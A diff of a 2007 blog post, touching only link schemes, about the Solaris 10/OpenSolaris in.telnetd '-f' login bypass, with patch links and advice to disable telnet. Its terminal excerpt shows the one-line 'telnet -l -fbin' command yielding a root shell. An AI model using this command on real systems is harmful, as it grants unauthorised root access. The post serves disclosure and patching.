@@ -14,9 +14,9 @@ type: post
 published: true
 ---
 <div class="alert">
-<strong>UPDATE:</strong> SunAlert <a href="http://sunsolve.sun.com/search/document.do?assetkey=1-26-102802-1">102802</a> and <del datetime="2007-02-14T10:20:28+00:00">IDR/ISR</del> official patches for this issue have been released:
+<strong>UPDATE:</strong> SunAlert <a href="https://sunsolve.sun.com/search/document.do?assetkey=1-26-102802-1">102802</a> and <del datetime="2007-02-14T10:20:28+00:00">IDR/ISR</del> official patches for this issue have been released:
 </div>
-<p>Ooops, how embarrassing, Solaris 10/OpenSolaris has a very silly stupid vulnerability in <code>in.telnetd/login</code> that has come to <a href="http://seclists.org/fulldisclosure/2007/Feb/0217.html">light</a>.  </p>
+<p>Ooops, how embarrassing, Solaris 10/OpenSolaris has a very silly stupid vulnerability in <code>in.telnetd/login</code> that has come to <a href="https://seclists.org/fulldisclosure/2007/Feb/0217.html">light</a>.  </p>
 <p>Essentially, you can get access to a remote Solaris 10/OpenSolaris system (which has telnet enabled) without any prompts or fancy tricks by simply using the "<code>-f&lt;username&gt;</code>" option:</p>
 <div class="terminal"><code><br />
 <span style="color: #0000ff">[ruler : ~]$</span> telnet -l -fbin devon<br />
@@ -43,7 +43,7 @@ uid=0(root) gid=0(root)<br />
 # CONSOLE=/dev/console<br />
 <span style="color: #ff0000">[devon : ~]#</span><br />
 </code></div>
-<p>It's quite amazing how long it's taken this issue to surface, especially considering how trivial it is. You can see details of the offending lines of code in <a href="http://www.com-winner.com/0day_was_the_case_that_they_gave_me.pdf">this PDF</a>.</p>
+<p>It's quite amazing how long it's taken this issue to surface, especially considering how trivial it is. You can see details of the offending lines of code in <a href="https://www.com-winner.com/0day_was_the_case_that_they_gave_me.pdf">this PDF</a>.</p>
 <p>That said, why are you still using telnet anyway?  Haven't you been warned about the dangers of using telnet?.  You should have abandoned telnet years ago.</p>
 <p><!--wsa:LongPostMiddle--></p>
 <p>What's more, if you're running a new install (not an upgrade) of Solaris 10 update 3 (11/06) you would have had to deliberately open yourself up to this vulnerability as Solaris 10u3 is the first release of Solaris to be "Secure by default", which means in.telnetd is DISABLED.</p>
@@ -60,22 +60,22 @@ disabled       14:27:42 svc:/network/telnet:default<br />
 </code></div>
 <p>You have been warned.</p>
 <div class="alert">
-<strong>UPDATE:</strong> SunAlert <a href="http://sunsolve.sun.com/search/document.do?assetkey=1-26-102802-1">102802</a> and <del datetime="2007-02-14T10:20:28+00:00">IDR/ISR</del> official patches for this issue have been released:
+<strong>UPDATE:</strong> SunAlert <a href="https://sunsolve.sun.com/search/document.do?assetkey=1-26-102802-1">102802</a> and <del datetime="2007-02-14T10:20:28+00:00">IDR/ISR</del> official patches for this issue have been released:
 </div>
 <ul>
 <li>SPARC Platform
 <ul>
 <li><del datetime="2007-02-14T10:20:28+00:00">Solaris 10 IDR125456-01 (Requires: 120068-01 - SunOS 5.10: in.telnetd Patch)</del><br />
-<a href="http://sunsolve.sun.com/search/document.do?assetkey=urn:cds:docid:1-21-120068-02-1">120068-02</a> - SunOS 5.10: in.telnetd Patch</li>
+<a href="https://sunsolve.sun.com/search/document.do?assetkey=urn:cds:docid:1-21-120068-02-1">120068-02</a> - SunOS 5.10: in.telnetd Patch</li>
 </ul>
 </li>
 <li>x86 Platform
 <ul>
 <li><del datetime="2007-02-14T10:20:28+00:00">Solaris 10 IDR125457-01 (Requires: 120069-01 - SunOS 5.10_x86: in.telnetd Patch)</del><br />
-<a href="http://sunsolve.sun.com/search/document.do?assetkey=urn:cds:docid:1-21-120069-02-1">120069-02</a> - SunOS 5.10_x86: in.telnetd Patch</li>
+<a href="https://sunsolve.sun.com/search/document.do?assetkey=urn:cds:docid:1-21-120069-02-1">120069-02</a> - SunOS 5.10_x86: in.telnetd Patch</li>
 </ul>
 </li>
 </ul>
-<p>As this is a security issue, the <del datetime="2007-02-14T10:20:28+00:00">IDR/ISRs</del> official patches are available direct to the public from <del datetime="2007-02-14T10:20:28+00:00"><a href="http://sunsolve.sun.com/tpatches">http://sunsolve.sun.com/tpatches</a></del> the links provided above.</p>
+<p>As this is a security issue, the <del datetime="2007-02-14T10:20:28+00:00">IDR/ISRs</del> official patches are available direct to the public from <del datetime="2007-02-14T10:20:28+00:00"><a href="https://sunsolve.sun.com/tpatches">https://sunsolve.sun.com/tpatches</a></del> the links provided above.</p>
 <p>Congratulations to <a href="https://blogs.sun.com/tpenta/entry/the_in_telnetd_vulnerability_exploit">Alan Hargreaves</a> and team for such an amazingly quick turn around - I've never seen a bug fixed this quick in all my time at Sun.</p>
 <p>Please install these NOW if you use telnet.  Official patches will follow shortly.</p>
